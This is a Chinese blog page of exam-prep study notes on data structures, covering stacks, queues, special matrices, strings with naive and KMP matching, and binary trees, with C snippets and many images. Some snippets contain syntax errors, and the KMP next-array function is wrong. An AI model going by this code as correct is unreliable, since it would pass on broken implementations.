<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603180407947.png" alt="image-20220603180407947" style="zoom:67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603180507316.png" alt="image-20220603180507316" style="zoom:67%;"></p>
<p>扫描到左括号就入栈，扫描到右括号就出栈进行匹配 </p>
<p>代码实现</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603182409614.png" alt="image-20220603182409614"></p>
<h2 id="栈在表达式求值中的应用"><a href="#栈在表达式求值中的应用" class="headerlink" title="栈在表达式求值中的应用"></a>栈在表达式求值中的应用</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603183310686.png" alt="image-20220603183310686"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603184904342.png" alt="image-20220603184904342"></p>
<p>先出栈的是右操作数，后出栈的是左操作数 </p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603191739417.png" alt="image-20220603191739417"></p>
<h2 id="栈的应用——递归"><a href="#栈的应用——递归" class="headerlink" title="栈的应用——递归"></a>栈的应用——递归</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192451544.png" alt="image-20220603192451544"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192500473.png" alt="image-20220603192500473"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192716850.png" alt="image-20220603192716850"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603193038318.png" alt="image-20220603193038318"></p>
<p>递归调用时，函数调用栈可称为递归工作栈</p>
<p>递归算法的缺点：太多层递归可能导致栈溢出。可能包含多次重复计算</p>
<h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p>具体查看树的章节</p>
<h3 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h3><p>具体查看图的章节</p>
<h3 id="在操作系统中的应用"><a href="#在操作系统中的应用" class="headerlink" title="在操作系统中的应用"></a>在操作系统中的应用</h3><p>FCFS(First Come First Service)先来先服务的策略</p>
<p>eg1：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194341970.png" alt="image-20220603194341970"></p>
<p>轮流获得cpu的服务</p>
<p>eg2：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194439959.png" alt="image-20220603194439959"></p>
<p>可缓解主机域打印机速度不匹配的问题</p>
<h2 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>ElemType a[10];    //ElemType型一维数组</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194725210.png" alt="image-20220603194725210"></p>
<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>ElemType b[2] [4]    //2行4列的二维数组</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194843476.png" alt="image-20220603194843476"></p>
<p>起始地址：LOC</p>
<p>行优先存储地址计算<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194958977.png" alt="image-20220603194958977"></p>
<p>列优先存储地址计算<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195101464.png" alt="image-20220603195101464"></p>
<p>二维数组也具有随机存储的性质</p>
<h3 id="普通矩阵的存储"><a href="#普通矩阵的存储" class="headerlink" title="普通矩阵的存储"></a>普通矩阵的存储</h3><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195510230.png" alt="image-20220603195510230"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195836998.png" alt="image-20220603195836998" style="zoom:67%;"></p>
<h3 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603200202029.png" alt="image-20220603200202029"></p>
<h3 id="三对角矩阵（带状矩阵）"><a href="#三对角矩阵（带状矩阵）" class="headerlink" title="三对角矩阵（带状矩阵）"></a>三对角矩阵（带状矩阵）</h3><p>  <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603200953049.png" alt="image-20220603200953049"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201426822.png" alt="image-20220603201426822" style="zoom:80%;"></p>
<h3 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h3><p>非零元素的个数远远少于矩阵元素的个数</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201607063.png" alt="image-20220603201607063" style="zoom:50%;"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603201638617.png" alt="image-20220603201638617" style="zoom: 80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201828331.png" alt="image-20220603201828331" style="zoom: 67%;"></p>
<h1 id="第四章——串"><a href="#第四章——串" class="headerlink" title="第四章——串"></a>第四章——串</h1><h2 id="串的基本操作"><a href="#串的基本操作" class="headerlink" title="串的基本操作"></a>串的基本操作</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>即字符串（string）由零个或者多个字符组成的有限序列，一般记为：</p>
<script type="math/tex; mode=display">
S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为空串</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162622856.png" alt="image-20220604162622856"></p>
<p>子串：串中任意个<strong>连续</strong>的字符组成的子序列</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163002890.png" alt="image-20220604163002890"></p>
<p>主串：包含子串的串</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162948821.png" alt="image-20220604162948821"></p>
<p>字符在主串中的位置：字符在串中的序号  （ps：空格也是一种字符）</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162939273.png" alt="image-20220604162939273"></p>
<p>子串在主串中的位置：子串的第一个字符在主串中的位置</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162903691.png" alt="image-20220604162903691" style="zoom:67%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163018603.png" alt="image-20220604163018603" style="zoom:67%;"></p>
<p>串是一种特殊的线性表，数据元素之间呈现线性关系</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163702551.png" alt="image-20220604163702551"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163803577.png" alt="image-20220604163803577" style="zoom:80%;"></p>
<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>y=f(x)</p>
<p>字符集：函数定义域</p>
<p>编码：函数映射规则f</p>
<p>y：对应的二进制数</p>
<p>英文字符——ASCII字符集  （2^8只有256种状态）</p>
<p>中英文——Unicode字符集</p>
<p>考研中默认每个字符占1B</p>
<h4 id="拓展——乱码问题"><a href="#拓展——乱码问题" class="headerlink" title="拓展——乱码问题"></a>拓展——乱码问题</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604164822168.png" alt="image-20220604164822168"></p>
<h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><h3 id="串的顺序存储"><a href="#串的顺序存储" class="headerlink" title="串的顺序存储"></a>串的顺序存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255     <span class="comment">//预定义最大串长为255</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];   <span class="comment">//每个分类存储一个字符</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的实际长度</span></span><br><span class="line">&#125;SString;<span class="comment">//静态数组实现（定长顺序存储）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *ch;          <span class="comment">//按串长分配存储区，ch指向串的基地址</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的长度</span></span><br><span class="line">&#125;HString;<span class="comment">//动态数组实现（堆分配存储）</span></span><br><span class="line">HString S;</span><br><span class="line">S.ch = (<span class="type">char</span> *)<span class="built_in">malloc</span>(MAXLEN*<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">S.length=<span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>优点：随机存取</p>
<p>缺点：插入删除操作不方便</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604165848221.png" alt="image-20220604165848221"></p>
<p>方案一：需要额外一片空间</p>
<p>方案二：length只占1B即8bit所以数组不能超过255</p>
<p>方案三：每次求表长都需要遍历整个字符串</p>
<h3 id="串的链式存储"><a href="#串的链式存储" class="headerlink" title="串的链式存储"></a>串的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch;                      <span class="comment">//每个结点存一个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;             <span class="comment">//存储密度低，每个字节1B，每个指针4B</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//改良</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">4</span>];                   <span class="comment">//每个结点存多个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604171058073.png" alt="image-20220604171058073"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604171107252.png" alt="image-20220604171107252"></p>
<h3 id="基本操作的实现"><a href="#基本操作的实现" class="headerlink" title="基本操作的实现"></a>基本操作的实现</h3><h4 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172524171.png" alt="image-20220604172524171"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">SubString</span><span class="params">(SString &amp;Sub,SString S,<span class="type">int</span> pos,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">//子串范围越界</span></span><br><span class="line">    <span class="keyword">if</span>(pos+len<span class="number">-1</span>&gt;S.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;len+pos;i++)</span><br><span class="line">        Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">    Sub.length=len;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="比较两个串的大小"><a href="#比较两个串的大小" class="headerlink" title="比较两个串的大小"></a>比较两个串的大小</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172617169.png" alt="image-20220604172617169" style="zoom:67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220604172621936.png" alt="image-20220604172621936" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">StrCompare</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=S.length &amp;&amp; i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]!=T.ch[i])</span><br><span class="line">            <span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描过的所有字符都相同，则长度长的串更大</span></span><br><span class="line">    <span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172716580.png" alt="image-20220604172716580"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172735794.png" alt="image-20220604172735794" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,n=S.length,m=T.length;</span><br><span class="line">    SString sub;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n-m+<span class="number">1</span>)&#123;</span><br><span class="line">        SubString(sub,S,i,m);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="朴素模式匹配算法"><a href="#朴素模式匹配算法" class="headerlink" title="朴素模式匹配算法"></a>朴素模式匹配算法</h2><p>字符串模式匹配：在主串中找到域模式串相同的子串，并返回其所在位置</p>
<p>子串：主串的一部分</p>
<p>模式串：不一定能在主串中找到</p>
<p>(暴力破解（穷举）)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]==T.ch[j])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;                <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主串长度为n</p>
<p>模式串长度为m</p>
<p>最好时间复杂度=O(n)</p>
<p>最坏时间复杂度=O((n-m+1)m)=O(nm)</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>基于朴素模式算法优化而来</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604181601977.png" alt="image-20220604181601977"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (S[i]!=T[j])</span><br><span class="line">    j=next[j];</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据模式串T，求出next数组——&gt;利用next数据进行匹配（主指针不回溯）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S,SString T,<span class="type">int</span> next[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">0</span> || S.ch[i]==T.ch[j ])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=next[j];          <span class="comment">//主串指针i不回溯，模式串向右移动，KMP算法核心</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏时间复杂度：O(m+n)     求next数组的时间复杂度O(m)模式匹配时间复杂度O(n)</p>
<h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a><strong>求next数组</strong></h2><p>任何模式串都一样</p>
<p>第一个字符不匹配时，next[1]=0</p>
<p>第二个字符不匹配时，next[2]=1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(SString S,SString T,<span class="type">int</span> *next)</span>&#123;</span><br><span class="line">    next[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;<span class="number">2</span> &amp;&amp; T.ch[i<span class="number">-1</span>]!=T.ch[j<span class="number">-2</span>])&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.ch[i<span class="number">-1</span>]=T.ch[j<span class="number">-1</span>])&#123;</span><br><span class="line">            length++;</span><br><span class="line">            i--,j--;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i]=length+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第五章——树与二叉树"><a href="#第五章——树与二叉树" class="headerlink" title="第五章——树与二叉树"></a>第五章——树与二叉树</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>非空树：有且仅有一个根节点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629122020259.png" alt="image-20220629122020259" style="zoom:67%;"></p>
<p>空树：节点数为0的树<br>没有后继的结点成为叶子节点（终端节点）<br><strong>除了根节点之外有且仅有一个前驱</strong></p>
<h3 id="子树"><a href="#子树" class="headerlink" title="子树"></a>子树</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629122304793.png" alt="image-20220629122304793"></p>
<p>子树互不相交</p>
<p><strong>树是一种递归定义的数据结构</strong></p>
<h3 id="节点之间的路径"><a href="#节点之间的路径" class="headerlink" title="节点之间的路径"></a>节点之间的路径</h3><p>路径是单向的，只能从上往下</p>
<h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a>路径长度</h3><p>经过几条边</p>
<h3 id="结点，树的属性描述"><a href="#结点，树的属性描述" class="headerlink" title="结点，树的属性描述"></a>结点，树的属性描述</h3><p>结点的层次（深度）——从上往下数<br>结点的高度——从下往上数<br>树的高度（深度）——总共多少层<br>结点的度——有几个孩子（分支）<br>树的度——各结点的度的最大值<br>默认从一开始</p>
<h2 id="有序树vs无序树"><a href="#有序树vs无序树" class="headerlink" title="有序树vs无序树"></a>有序树vs无序树</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629123151781.png" alt="image-20220629123151781"></p>
<h2 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h2><p>森林是m棵互不相交的树的集合（m可为0，表示空森林）</p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>结点数=总度数+1<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140810203.png" alt="image-20220701140810203"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140849174.png" alt="image-20220701140849174"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140928499.png" alt="image-20220701140928499"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141014648.png" alt="image-20220701141014648"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141202675.png" alt="image-20220701141202675"></p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>二叉树是有序树（左右子树不能颠倒）递归定义的数据结构</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141656221.png" alt="image-20220701141656221"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701142020842.png" alt="image-20220701142020842"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701142503488.png" alt="image-20220701142503488"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709114958544.png" alt="image-20220709114958544"></p>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    ElemType value;<span class="comment">//结点中的数据元素</span></span><br><span class="line">    <span class="type">bool</span> isEmpty;<span class="comment">//结点是否为空</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];<span class="comment">//定义一个长度为MaxSize的数组t，按照从上至下从左至右的顺序依次存储完全二叉树的各个结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)&#123;</span><br><span class="line">    t[i].isEmpty=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120058958.png" alt="image-20220709120058958"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120134485.png" alt="image-20220709120134485"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120216992.png" alt="image-20220709120216992"></p>
<h3 id="二叉树的链式存储"><a href="#二叉树的链式存储" class="headerlink" title="二叉树的链式存储"></a>二叉树的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">	ElemType data;                     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>    <span class="comment">//左右孩子指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">parent</span>;</span>            <span class="comment">//父节点指针（三叉链表——方便找父节点）</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709121942852.png" alt="image-20220709121942852"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一颗空树</span></span><br><span class="line">BiTree root =null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入根节点</span></span><br><span class="line">root = (BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild = null;</span><br><span class="line">root-&gt;rchild = null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入新结点</span></span><br><span class="line">BiTNode * p =(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">p-&gt;data = &#123;<span class="number">2</span>&#125;;</span><br><span class="line">p-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;rchild = null;</span><br><span class="line">root-&gt;lchild = p;  <span class="comment">//作为根结点的左孩子</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709125146274.png" alt="image-20220709125146274"></p>
